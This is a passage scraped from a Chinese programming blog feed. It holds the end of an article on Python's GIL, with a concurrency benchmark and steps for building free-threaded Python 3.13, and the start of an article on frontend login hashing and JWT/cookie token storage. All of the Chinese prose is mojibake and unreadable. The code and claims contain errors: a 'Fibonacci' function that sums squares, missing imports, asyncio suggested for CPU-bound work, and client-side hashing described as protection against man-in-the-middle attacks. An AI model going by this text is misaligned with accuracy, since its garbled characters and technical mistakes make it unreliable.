<span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ProcessPoolExecutor

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_bound_task</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""CPU å¯†é›†å‹ï¼šæ–æ³¢é‚£å¥‘è®¡ç®—"""</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        count += i * i
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">async_io_task</span>() -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""ä½¿ç”¨ asyncio è¿›è¡Œ I/O æ¨¡æ‹Ÿã€‚"""</span>
    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">0.1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"async done"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">benchmark</span>():
    <span class="hljs-string">"""æ¯”è¾ƒ threading, multiprocessing, å’Œ async."""</span>
    n = <span class="hljs-number">1000000</span>
    tasks = <span class="hljs-number">8</span>
    
    <span class="hljs-comment"># å•çº¿ç¨‹åŸºçº¿</span>
    start = time.perf_counter()
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tasks):
        cpu_bound_task(n)
    baseline = time.perf_counter() - start
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Single-threaded: <span class="hljs-subst">{baseline:<span class="hljs-number">.2</span>f}</span>s"</span>)
    
    <span class="hljs-comment"># å¤šçº¿ç¨‹ï¼ˆå— GIL é™åˆ¶ï¼‰</span>
    start = time.perf_counter()
    threads = [
        threading.Thread(target=cpu_bound_task, args=(n,))
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tasks)
    ]
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()
    threaded = time.perf_counter() - start
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Multi-threaded: <span class="hljs-subst">{threaded:<span class="hljs-number">.2</span>f}</span>s (slowdown: <span class="hljs-subst">{threaded/baseline:<span class="hljs-number">.2</span>f}</span>x)"</span>)
    
    <span class="hljs-comment"># å¤šè¿›ç¨‹ï¼ˆçœŸæ­£çš„å¹¶è¡Œï¼‰</span>
    start = time.perf_counter()
    <span class="hljs-keyword">with</span> ProcessPoolExecutor(max_workers=tasks) <span class="hljs-keyword">as</span> executor:
        futures = [executor.submit(cpu_bound_task, n) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tasks)]
        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> futures:
            f.result()
    multiproc = time.perf_counter() - start
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Multi-processing: <span class="hljs-subst">{multiproc:<span class="hljs-number">.2</span>f}</span>s (speedup: <span class="hljs-subst">{baseline/multiproc:<span class="hljs-number">.2</span>f}</span>x)"</span>)

benchmark()
</code></pre>
<p>4 æ ¸ CPUï¼ˆå…¸å‹ï¼‰çš„ç»“æœï¼š</p>
<ul>
<li>å•çº¿ç¨‹: 8.5s</li>
<li>å¤šçº¿ç¨‹ï¼š11.2sï¼ˆå›  GIL å¼€é”€å¯¼è‡´æ…¢äº† 1.3 å€ï¼‰</li>
<li>å¤šè¿›ç¨‹ï¼š2.3sï¼ˆçœŸæ­£çš„å¹¶è¡Œå¿«äº† 3.7 å€ï¼‰</li>
</ul>
<h2 data-id="heading-28">Python 3.13 ä¸æœªæ¥ â€”â€” è‡ªç”±çº¿ç¨‹çš„åˆ°æ¥</h2>
<p>2024 å¹´ 10 æœˆæ ‡å¿—ç€å†å²æ€§é‡Œç¨‹ç¢‘ï¼šPython 3.13 å¼•å…¥äº†å®éªŒæ€§çš„è‡ªç”±çº¿ç¨‹æ¨¡å¼ã€‚</p>
<h5 data-id="heading-29">å®ç°è‡ªç”±çº¿ç¨‹</h5>
<p>ä»æºä»£ç æ„å»ºï¼ˆæ”¯æŒè‡ªç”±çº¿ç¨‹å¿…ä¸å¯å°‘ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸‹è½½ Python 3.13 æºç </span>
wget https://www.python.org/ftp/python/3.13.0/Python-3.13.0.tgz
tar -xf Python-3.13.0.tgz
<span class="hljs-built_in">cd</span> Python-3.13.0

<span class="hljs-comment"># é…ç½® --disable-gil</span>
./configure --disable-gil --prefix=<span class="hljs-variable">$HOME</span>/python3.13

<span class="hljs-comment"># ç¼–è¯‘å®‰è£…</span>
make
make altinstall
</code></pre>
<p>è¿è¡Œæ—¶æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é€šè¿‡å‘½ä»¤è¡Œç¦ç”¨ GIL</span>
python -X gil=0 script.py

<span class="hljs-comment"># æˆ–è€…é€šè¿‡ç¯å¢ƒå˜é‡</span>
<span class="hljs-built_in">export</span> PYTHON_GIL=0
python script.py
</code></pre>
<p>æ£€æµ‹ GIL çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> sysconfig

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_gil_status</span>():
    <span class="hljs-string">"""æ£€æŸ¥æ˜¯å¦å¯ç”¨äº† GIL (Python 3.13+)."""</span>
    <span class="hljs-keyword">if</span> sys.version_info &gt;= (<span class="hljs-number">3</span>, <span class="hljs-number">13</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(sys, <span class="hljs-string">'_is_gil_enabled'</span>):
            status = sys._is_gil_enabled()
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"GIL enabled: <span class="hljs-subst">{status}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Free-threading build not available"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Python 3.13+ required for GIL control"</span>)

check_gil_status()
</code></pre>
<h5 data-id="heading-30">æ€§èƒ½ç‰¹å¾</h5>
<p>å•çº¿ç¨‹æ€§èƒ½ä¸‹é™ï¼š</p>
<ul>
<li>è‡ªç”±çº¿ç¨‹æ¨¡å¼åœ¨å•çº¿ç¨‹ä»£ç ä¸­æ…¢äº† 6â€“15%</li>
<li>ç”±ç¦ç”¨çš„è‡ªé€‚åº”è§£é‡Šå™¨å¼•èµ·ï¼ˆå°šæœªæ”¯æŒçº¿ç¨‹å®‰å…¨ï¼‰</li>
<li>æ¥è‡ªå•å¯¹è±¡é”å®šå’ŒåŸå­æ“ä½œçš„é¢å¤–å¼€é”€</li>
</ul>
<p>å¤šçº¿ç¨‹ CPU å¯†é›†å‹å¢ç›Šï¼š</p>
<ul>
<li>4 çº¿ç¨‹ï¼š3.5 å€åŠ é€Ÿï¼ˆæ–æ³¢é‚£å¥‘åŸºå‡†æµ‹è¯•ä» 0.42s åˆ° 0.12sï¼‰</li>
<li>8 çº¿ç¨‹ï¼šCPU å¯†é›†å‹ä»»åŠ¡çš„è¿‘çº¿æ€§æ‰©å±•</li>
<li>çº¯ Python ä»£ç ç»ˆäºè§£é”äº†çœŸæ­£çš„å¹¶è¡Œ</li>
</ul>
<p>å†…å­˜å½±å“ï¼š</p>
<ul>
<li>åƒåœ¾å›æ”¶å¼€é”€å¢åŠ äº†çº¦ 14%</li>
<li>Mimalloc åˆ†é…å™¨ç”Ÿæ•ˆï¼ˆé»˜è®¤åŒ…å«ï¼‰</li>
<li>æ›´å¤æ‚çš„å†…å­˜åè°ƒä»¥å®ç°çº¿ç¨‹å®‰å…¨</li>
</ul>
<p>å»ºè®®ï¼šç”Ÿäº§ç¯å¢ƒç­‰å¾… Python 3.14 ä»¥ä¸Šç‰ˆæœ¬ï¼Œ3.13 çš„è‡ªç”±çº¿ç¨‹æ¨¡å¼æ˜¯å®éªŒæ€§çš„ï¼Œå¤„ç†è¾¹ç•Œæ¡ä»¶è¿˜æ¯”è¾ƒç²—ç³™ã€‚</p>
<h2 data-id="heading-31">æ€»ç»“ä¸åæ¨¡å¼æŒ‡å—</h2>
<h5 data-id="heading-32">Python å¤šçº¿ç¨‹é»„é‡‘æ³•åˆ™</h5>
<p>âœ… çº¿ç¨‹ç”¨äºï¼š</p>
<ul>
<li>ç½‘é¡µè¯·æ±‚å¤„ç†ï¼ˆAPIï¼Œçˆ¬è™«ï¼‰</li>
<li>æ–‡ä»¶ I/O æ“ä½œï¼ˆæ‰¹å¤„ç†ï¼‰</li>
<li>æ•°æ®åº“æŸ¥è¯¢èšåˆ</li>
<li>å®æ—¶æ•°æ®æ”¶é›†</li>
<li>ç½‘ç»œä»»åŠ¡</li>
</ul>
<p>âŒ é¿å…ç”¨çº¿ç¨‹å¤„ç†ï¼š</p>
<ul>
<li>ç§‘å­¦è®¡ç®—</li>
<li>å›¾åƒ/è§†é¢‘å¤„ç†</li>
<li>åŠ è§£å¯†</li>
<li>æœºå™¨å­¦ä¹ è®­ç»ƒ</li>
<li>çº¯ CPU å¯†é›†å‹å·¥ä½œ</li>
</ul>
<p>å¯¹äº CPU å¯†é›†å‹ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ <code>multiprocessing</code> æˆ– <code>asyncio</code>ã€‚</p>
<h5 data-id="heading-33">å¿…çŸ¥åŸåˆ™</h5>
<ol>
<li>ä¸€å®šè¦ç”¨çº¿ç¨‹æ± ï¼Œç»ä¸è¦æ‰‹åŠ¨ç®¡ç†çº¿ç¨‹</li>
<li>å…±äº«å¯å˜çŠ¶æ€å¿…é¡»åŒæ­¥ï¼ˆé”æˆ– <code>Queue</code>ï¼‰</li>
<li>è°¨æ…è®¾ç½® <code>daemon</code> â€”â€” ç†è§£ç»ˆæ­¢è¯­ä¹‰</li>
<li>ç”¨ <code>Queue</code> è¿›è¡Œçº¿ç¨‹é—´é€šä¿¡</li>
<li>æ£€æŸ¥ <code>future.result()</code> ä»¥æ•æ‰å¼‚å¸¸</li>
<li>ç”¨æ­£ç¡®çš„é”å±‚çº§ç›‘æ§æ­»é”</li>
</ol>
<h5 data-id="heading-34">å¸¸è§çš„é™·é˜±</h5>
<p>ğŸš¨ æ­»é”ï¼š</p>
<ul>
<li>æ— åºåµŒå¥—é”</li>
<li>çº¿ç¨‹æ± çš„è‡ªæˆ‘ç­‰å¾…</li>
<li>GC æœŸé—´è®¿é—® <code>__del__</code></li>
</ul>
<p>ğŸš¨ ç«æ€æ¡ä»¶ï¼š</p>
<ul>
<li>éåŒæ­¥å…±äº«å˜é‡</li>
<li>å¯¹åˆ—è¡¨/æŒ‡ä»¤çš„éåŸå­æ“ä½œ</li>
<li>å¯¹ <code>balance += 1</code> è¿™æ ·çš„æ“ä½œæ²¡æœ‰é”å®š</li>
</ul>
<p>ğŸš¨ çº¿ç¨‹æ³„éœ²ï¼š</p>
<ul>
<li>åœ¨éå®ˆæŠ¤çº¿ç¨‹ä¸­å¿˜è®° <code>join()</code></li>
<li>é•¿æœŸè¿è¡Œçš„çº¿ç¨‹æ­£åœ¨ç´¯ç§¯å†…å­˜</li>
<li>è§£å†³æ–¹æ¡ˆï¼šå‘¨æœŸæ€§å›æ”¶</li>
</ul>
<p>ğŸš¨ å¼‚å¸¸ä¸¢å¤±ï¼š</p>
<ul>
<li>çº¿ç¨‹å¼‚å¸¸ä¸ä¼šè‡ªåŠ¨ä¼ æ’­</li>
<li>ä¸€å®šè¦ä½¿ç”¨æ‰§è¡Œç¨‹åºæˆ–æ˜¾å¼é”™è¯¯å¤„ç†</li>
</ul>
<h5 data-id="heading-35">æ–°æ—¶ä»£ï¼šè‡ªç”±çº¿ç¨‹ Python</h5>
<p>Python 3.13 çš„å¯é€‰ç§»é™¤ GIL åªæ˜¯å¼€å§‹ï¼Œç”Ÿæ€ç³»ç»Ÿå½±å“ï¼š</p>
<ul>
<li>åº“ï¼šNumPyã€Pandasã€scikit-learn éœ€è¦æ›´æ–°</li>
<li>æ€§èƒ½è°ƒä¼˜ï¼šè‡ªç”±çº¿ç¨‹ä»£ç éœ€è¦æ–°çš„é…ç½®æ–‡ä»¶</li>
<li>è¿ç§»æ—¶é—´è¡¨ï¼šé¢„è®¡ Python 3.14â€“3.15 ç‰ˆæœ¬å°†å®ç°ç”Ÿäº§å‡†å¤‡</li>
</ul>
<p>GIL å®šä¹‰äº† Python çš„ 30 å¹´ï¼Œå®ƒçš„ç§»é™¤å°†å®šä¹‰æœªæ¥ 30 å¹´ã€‚</p>
<h2 data-id="heading-36">å»¶ä¼¸é˜…è¯»ï¼š</h2>
<p>Python çº¿ç¨‹å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fthreading.html" title="https://docs.python.org/3/library/threading.html" target="_blank" ref="nofollow noopener noreferrer">docs.python.org/3/library/tâ€¦</a></p>
<p>David Beazley çš„ GIL æ·±åº¦åˆ†æï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.dabeaz.com%2Fpython%2FUnderstandingGIL.pdf" title="https://www.dabeaz.com/python/UnderstandingGIL.pdf" target="_blank" ref="nofollow noopener noreferrer">www.dabeaz.com/python/Undeâ€¦</a></p>
<p>çœŸå®çš„ Python çº¿ç¨‹æŒ‡å—ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frealpython.com%2Fintro-to-python-threading" title="https://realpython.com/intro-to-python-threading" target="_blank" ref="nofollow noopener noreferrer">realpython.com/intro-to-pyâ€¦</a></p>
<p>PEP 703ï¼ˆè‡ªç”±çº¿ç¨‹ææ¡ˆï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0703" title="https://peps.python.org/pep-0703" target="_blank" ref="nofollow noopener noreferrer">peps.python.org/pep-0703</a></p>
<hr/>
<blockquote>
<p>Hiï¼Œæˆ‘æ˜¯ä¿å‡¡ï¼Œä¸€åå…¼å…·æŠ€æœ¯æ·±åº¦ä¸ç®¡ç†è§†é‡çš„æŠ€æœ¯ç®¡ç†è€…ã€‚æ›¾å°±èŒäº Motorolaï¼Œç°ä»»èŒäº Mavenirï¼Œå¤šå¹´å¸¦é¢†æŠ€æœ¯å›¢é˜Ÿï¼Œèšç„¦åç«¯æ¶æ„ä¸äº‘åŸç”Ÿï¼ŒæŒç»­å…³æ³¨ AI ç­‰å‰æ²¿æ–¹å‘ï¼Œä¹Ÿå…³æ³¨äººçš„æˆé•¿ï¼Œç¬ƒä¿¡æŒç»­å­¦ä¹ çš„åŠ›é‡ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«æŠ€æœ¯å®è·µä¸æ€è€ƒã€‚æ¬¢è¿å…³æ³¨å…¬ä¼—å·ã€ŒDeepNoMindã€ï¼Œæ˜Ÿæ ‡ä¸è¿·è·¯ã€‚ä¹Ÿæ¬¢è¿è®¿é—®ç‹¬ç«‹ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.deepnomind.com" title="https://www.deepnomind.com" target="_blank" ref="nofollow noopener noreferrer">www.DeepNoMind.com</a>ï¼Œä¸€èµ·äº¤æµæˆé•¿ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯ç™»å½•åŠ å¯†ä¸Tokenç®¡ç†å®è·µ]]></title>    <link>https://juejin.cn/post/7589124380758622227</link>    <guid>https://juejin.cn/post/7589124380758622227</guid>    <pubDate>2025-12-29T04:26:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589124380758622227" data-draft-id="7589102404168679443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯ç™»å½•åŠ å¯†ä¸Tokenç®¡ç†å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T04:26:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="saberxyL"/> <meta itemprop="url" content="https://juejin.cn/user/3942228504379243"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯ç™»å½•åŠ å¯†ä¸Tokenç®¡ç†å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3942228504379243/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    saberxyL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:26:27.000Z" title="Mon Dec 29 2025 04:26:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰ç«¯ç™»å½•åŠ å¯†ä¸Tokenç®¡ç†å®è·µ</h2>
<blockquote>
<p>å‰åç«¯åˆ†ç¦»æ¶æ„ä¸‹çš„ç™»å½•å®‰å…¨ã€Tokenå­˜å‚¨æ–¹æ¡ˆã€‚æ¶µç›–ç™»å½•åŠ å¯†ã€JWTã€Cookie+httpOnlyç­‰æ ¸å¿ƒå†…å®¹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä¸€ã€ç™»å½•åŠ å¯†æµç¨‹</h3>
<h4 data-id="heading-2">æ–¹æ¡ˆï¼šå‰ç«¯å“ˆå¸Œ + HTTPS + åç«¯å¼ºå“ˆå¸Œ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username, password</span>) {
  <span class="hljs-comment">// 1. å‰ç«¯å“ˆå¸Œï¼ˆé˜²ä¸­é—´äººæ”»å‡»ï¼‰</span>
  <span class="hljs-keyword">const</span> hashedPwd = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">SHA256</span>(password).<span class="hljs-title function_">toString</span>();
  
  <span class="hljs-comment">// 2. HTTPSä¼ è¾“</span>
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/login'</span>, { username, <span class="hljs-attr">password</span>: hashedPwd });
  
  <span class="hljs-comment">// 3. Tokenè‡ªåŠ¨å­˜å‚¨ï¼ˆæµè§ˆå™¨æŸ¥çœ‹åç«¯å“åº”å¤´è‡ªåŠ¨å­˜å‚¨tokenå¹¶å¤„ç†httpOnly Cookieï¼‰</span>
}

<span class="hljs-comment">// åç«¯ï¼ˆå¿…é¡»ï¼‰</span>
<span class="hljs-comment">// 1. äºŒæ¬¡åŠ ç›å“ˆå¸Œå­˜å‚¨</span>
<span class="hljs-keyword">const</span> bcryptHash = <span class="hljs-keyword">await</span> bcrypt.<span class="hljs-title function_">hash</span>(hashedPwd, <span class="hljs-number">12</span>);
<span class="hljs-comment">// 2. ç”ŸæˆJWTæ”¾å…¥httpOnly Cookie</span>
</code></pre>
<h4 data-id="heading-3">æ ¸å¿ƒåŸåˆ™</h4>
<ul>
<li><strong>HTTPS æ˜¯å¼ºåˆ¶å‰æ</strong>ï¼šæ‰€æœ‰ç™»å½•è¯·æ±‚å¿…é¡»é€šè¿‡HTTPSä¼ è¾“</li>
<li><strong>åç«¯å¿…é¡»ç”¨ bcrypt/Argon2</strong>ï¼šå³ä½¿å‰ç«¯å·²å“ˆå¸Œï¼Œåç«¯ä»éœ€å¼ºå“ˆå¸Œå­˜å‚¨</li>
<li><strong>å‰ç«¯å“ˆå¸Œæ˜¯å¯é€‰çš„</strong>ï¼šä¸»è¦é˜²ä¼ è¾“å±‚æ³„éœ²ï¼Œéå¿…éœ€ä½†æ¨è</li>
</ul>
<hr/>
<h3 data-id="heading-4">äºŒã€JWTè¯¦è§£</h3>
<h4 data-id="heading-5">ç»“æ„</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.Payload</span><span class="hljs-selector-class">.Signature</span>
</code></pre>
<p><strong>1. Headerï¼ˆå¤´éƒ¨ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå£°æ˜ç®—æ³•å’Œç±»å‹ã€‚</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š
json
json
{
"alg": "HS256",  // ç­¾åç®—æ³•ï¼ˆå¦‚ HMAC SHA256ï¼‰
"typ": "JWT"     // Token ç±»å‹
}</li>
<li><strong>Base64Url ç¼–ç </strong>åæˆä¸ºç¬¬ä¸€éƒ¨åˆ†ã€‚</li>
</ul>
<p><strong>2. Payloadï¼ˆè½½è·ï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå­˜æ”¾å®é™…æ•°æ®ï¼ˆç§°ä¸ºâ€œå£°æ˜â€ Claimsï¼‰ã€‚</li>
<li><strong>æ ‡å‡†å£°æ˜</strong>ï¼ˆå¯é€‰ï¼‰ï¼š
<ul>
<li><code>iss</code>ï¼ˆç­¾å‘è€…ï¼‰</li>
<li><code>exp</code>ï¼ˆè¿‡æœŸæ—¶é—´ï¼‰</li>
<li><code>sub</code>ï¼ˆä¸»é¢˜ï¼Œå¦‚ç”¨æˆ·IDï¼‰</li>
<li><code>aud</code>ï¼ˆæ¥æ”¶è€…ï¼‰</li>
</ul>
</li>
<li><strong>è‡ªå®šä¹‰å£°æ˜</strong>ï¼šä¸šåŠ¡ç›¸å…³æ•°æ®ï¼ˆå¦‚ç”¨æˆ·è§’è‰²ã€æƒé™ï¼‰ã€‚
json
json
{
"sub": "1234567890",
"name": "John Doe",
"role": "admin",
"exp": 1717986919  // è¿‡æœŸæ—¶é—´æˆ³ï¼ˆUTCï¼‰
}</li>
<li><strong>Base64Url ç¼–ç </strong>åæˆä¸ºç¬¬äºŒéƒ¨åˆ†ã€‚ âš ï¸ <strong>æ³¨æ„</strong>ï¼šPayload <strong>æœªåŠ å¯†</strong>ï¼Œä»…é˜²ç¯¡æ”¹ï¼Œ<strong>ä¸è¦å­˜å‚¨æ•æ„Ÿä¿¡æ¯</strong>ï¼ˆå¦‚å¯†ç ï¼‰ã€‚</li>
</ul>
<p><strong>3. Signatureï¼ˆç­¾åï¼‰</strong></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šéªŒè¯ Token æœªè¢«ç¯¡æ”¹ã€‚</li>
<li><strong>ç”Ÿæˆæ–¹å¼</strong>ï¼š
text
text
HMACSHA256(
base64UrlEncode(header) + "." + base64UrlEncode(payload),
secret_key
)</li>
<li><strong>ç»“æœ</strong>ï¼šç­¾å + å‰ä¸¤éƒ¨åˆ† = æœ€ç»ˆ JWTã€‚</li>
</ul>
<h4 data-id="heading-6">å®‰å…¨å®è·µ</h4>
<ul>
<li><strong>çŸ­æœ‰æ•ˆæœŸ</strong>ï¼š15åˆ†é’Ÿè®¿é—®ä»¤ç‰Œ + 7å¤©åˆ·æ–°ä»¤ç‰Œ</li>
<li><strong>ä¸å­˜æ•æ„Ÿæ•°æ®</strong>ï¼šå¯†ç ã€æ‰‹æœºå·ç­‰ç»ä¸åœ¨Payloadä¸­</li>
<li><strong>httpOnly Cookieå­˜å‚¨</strong>ï¼šé˜²XSS</li>
